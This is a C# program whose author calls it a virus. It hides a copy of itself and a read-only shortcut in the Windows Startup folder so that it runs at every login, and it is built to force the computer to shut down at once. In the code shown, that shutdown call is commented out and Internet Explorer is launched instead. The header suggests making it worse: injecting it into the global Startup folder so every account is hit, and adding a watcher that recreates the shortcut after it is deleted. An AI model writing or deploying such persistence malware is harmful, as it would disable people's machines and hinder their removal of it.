using System;
using System.IO;
using System.Timers;
using IWshRuntimeLibrary;
using System.Diagnostics;

/*=============================================================================
 |       AUTHOR:  KESLER MATHIEU
 |     LANGUAGE:  Visual C# Command Line Compiler v2.9.0.63208
 |     TO COMPILE VIA CMD LINE:  csc /reference:{filepath}\Interop.IWshRuntimeLibrary.dll .\ShutDown.cs
 |     DEPENDENCY: Interop.IwshRuntimeLibrary.dll
 +-----------------------------------------------------------------------------
 |
 |  DESCRIPTION:  ***WARNING!!!*** RUNNING THE EXECUTABLE IS AT YOUR DISCRETION.
 |
 |        INPUT:  N/A - (OTHER THAN RUNNING THIS FILE)
 |
 |       OUTPUT:  CREATES A SHUTDOWN.LNK FILE IN A USER'S STARTUP DIRECTORY THAT 
 |                CALLS THE "Shutdown.exe" APPLICATION EVERYTIME THE HOST'S
 |                ACCOUNT IS LOGGED INTO. This "Shutdown.exe" APP CREATES AND RUNS
 |                THE "C:\Windows\System32\shutdown.exe" PROCESS WHICH WILL 
 |                FORCIBLY TURN OFF YOUR COMPUTER. WITH THIS SETUP, YOUR COMPUTER WILL TURN
 |                 OFF EVERY TIME THE INFECTED HOST LOGGS IN.
 |
 | COUNTERMEASURES: RUN WINDOWS IN SAFE MODE AND NAVIGATE TO THE STARTUP FOLDER. DELETE THE
 |                  SHUTDOWN.LNK FILE.
 |
 | IMPROVEMENTS: 1 - OVERRIDING PERMISSIONS ON THE GLOBAL STARTUP DIRECTORY AND INJECTING
 |               THE SHUTDOWN.LNK FILE INTO IT WILL BE CATASTROPHIC TO A COMPUTER
 |               AS PROGRAMS WITHIN THE GLOBAL DIRECTORY TAKES RUNNING PRECEDENCE 
 |               OVER APPLICATIONS IN THE LOCAL STARTUP. THIS IMPLIES THAT ALL USER ACCOUNTS
 |               WILL SHUTOFF WHEN LOGGED INTO!
 |
 |               2 - THERE IS NO NEED FOR SHUTDOWN.EXE TO BE PLACED WITHIN STARTUP DIR. IT'S JUST 
 |               PREFERENTIAL TO HAVE BOTH FILES IN ONE LOCATION FOR NOW IN THE PREMATURE PHASE OF THIS SCRIPT. 
 |               A BETTER DESIGN CAN BE CONSIDERED WHEN INTRODUCING RANDOM DIRECTORY PLACEMENT OF EXE FILE 
 |               THERBY INCREASING THE DIFFICULTY TO DELETE BOTH AT ONCE.
 |               HAVING BOTH FILES IN SEPERATE LOCATIONS ALLOWS FOR THE SHUTDOWN.EXE TO IMPLEMENT SOME 
 |               LISTENER THAT MONITORS THE EXISTENCE OF THAT SHUTDOWN.LNK FILE AND RECREATE IT UPON IT'S DELETION.
 |               THIS ROBUST FEATURE WILL ENSURE THE LONGEVITY OF THIS VIRUS.
 |
 |   Known Bugs:  N/A
 |
 *===========================================================================*/
namespace WindowExecutables_v2._0
{
    public sealed class ShutDown
    {
        private string localStartupDir;
        private static readonly string SHUTDOWN_CMD = @"C:\Windows\System32\shutdown.exe";
        private static readonly string SHUTDOWN_ARGS = "/s /f /t 0";
        private static readonly string C_SHARP_EXE = "ShutDown.exe";

        public ShutDown()
        {
            string pathTemplate = @"C:\Users\{0}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\";
            this.localStartupDir = pathTemplate.Replace("{0}", Environment.UserName);
        }


        public static void displayDestructionMsg(int countdown)
        {
            if (countdown > 0)
                {
                string img = @"
                                         ::================:          
                                        / ||              ||        
                                       /  ||    System    ||        
                                      |   ||   ShutDown   ||                
                                       \  || Please wait..||
                                        \ ||              || 
                                         ::=================              
                                   ........... /      \.............                                                         
                                   :\        ############            \   
                                   : ---------------------------------     
                                   : |  *   |__________|| ::::::::::  |                                             
                                   \ |      |          ||   .......   |    
                                     --------------------------------- 8   
                                                                        8 
                                     --------------------------------- 8   
                                     \   ###########################  \    
                                      \  +++++++++++++++++++++++++++   \ 
                                       \ ++++++++++++++++++++++++++++   \
                                        \________________________________\ 
                                         ********************************* 
                                            -Targon (Ed Wisniewski)-";

                Console.WriteLine(img+"\n");

                while (countdown >= 0)
                    {
                    Console.WriteLine("                                    COMPUTER WILL PERMANENTLY CEASE TO OPERATE IN: " + countdown.ToString() + " SECONDS!");
                    countdown--;
                    System.Threading.Thread.Sleep(1000);
                    }
                }
        }

        public string getLocalStartupDir()
        {
            return this.localStartupDir;
        }

        public string getAppCurrentDirectory()
        {
            string dir = "";
            try
            {
                dir = Directory.GetCurrentDirectory();
            }
            catch (Exception e)
            {
                Console.WriteLine("Exception caught: " + e.ToString());
            }
            return dir + @"\";
        }

        public bool createShortcutFile(string targetFile)
        {
            bool isCreated = false;
            string shortcutFile = this.localStartupDir + "ShutDown.lnk";
            Console.WriteLine(shortcutFile);
            if (!System.IO.File.Exists(shortcutFile))
            {
                try
                {
                    WshShell shell = new WshShell();
                    IWshShortcut link =
                    (IWshShortcut)shell.CreateShortcut(shortcutFile);
                    link.TargetPath = targetFile;
                    link.Save();
                    System.IO.File.SetAttributes(shortcutFile, FileAttributes.Hidden | FileAttributes.ReadOnly);
                    isCreated = true;
                    return isCreated;
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: " + e.ToString());
                }
            }
            return isCreated;
        }

        /*Features
        *1 - Does not delete if destfile is already present in path
        *2 - Makes destFile hidden and readonly
        */
        private int moveFile(String sourceFile, String destFile)
        {
            int isMoved = 0;
            if (!System.IO.File.Exists(destFile))
            {
                try
                {
                    System.IO.File.Move(sourceFile, destFile);
                    System.IO.File.SetAttributes(destFile, FileAttributes.Hidden | FileAttributes.ReadOnly);
                    isMoved = 1;
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: " + e.ToString());
                    isMoved = -1;
                }
            }
            return isMoved;
        }

        public int moveExeToStartupDir()
        {
            string currentExeFilePath = this.getAppCurrentDirectory() + C_SHARP_EXE;
            string destExeFilePath = localStartupDir + C_SHARP_EXE;
            return moveFile(currentExeFilePath, destExeFilePath);
        }

        //TODO - create this feature!
        // public int moveExeToRandDir(){
        //     string currentExeFilePath = this.getAppCurrentDirectory() + C_SHARP_EXE;
        //     string destExeFilePath = this.findRandPath() + C_SHARP_EXE;
        //     return moveFile(currentExeFilePath, destExeFilePath);
        // }

        public bool runTurnOffCMD()
        {
            Process myProcess = new Process();
            myProcess.StartInfo.FileName = "iexplore.exe";
            //myProcess.StartInfo.FileName = SHUTDOWN_CMD;
            //myProcess.StartInfo.Arguments = SHUTDOWN_ARGS;
            //myProcess.StartInfo.UseShellExecute = false;
            myProcess.StartInfo.CreateNoWindow = true;
            try
            {
                return myProcess.Start();
            }
            catch (Exception e)
            {
                Console.WriteLine("Exception caught " + e.ToString());
            }
            return false;
        }

        /* Moves Shutdown.exe to Startup dir then shortcut file will point to it.
         * If .exe cannot be placed within startup dir, then shortcut file will point to its current location
         *
         * Refer to section 2 of improvements for more details on this main method implementation
         */
        public static void Main()
        {
            ShutDown.displayDestructionMsg(countdown:10);
            ShutDown sysOff = new ShutDown();
            int moveToStartupStatus = sysOff.moveExeToStartupDir();
            Console.WriteLine(moveToStartupStatus);

            if (moveToStartupStatus == 1)
            {
                Console.WriteLine(sysOff.getLocalStartupDir() + C_SHARP_EXE);
                bool createShortcutFileStatus =
                sysOff.createShortcutFile(targetFile: sysOff.getLocalStartupDir() + C_SHARP_EXE);
                Console.WriteLine(createShortcutFileStatus);
            }
            //TODO: system tries to create another shortcut umongst restart but missing dll file..this shouldnt happen tho since it checks the file existence
            else
            {
                sysOff.createShortcutFile(targetFile: sysOff.getAppCurrentDirectory() + C_SHARP_EXE);
            }
            sysOff.runTurnOffCMD();
        }
    }
}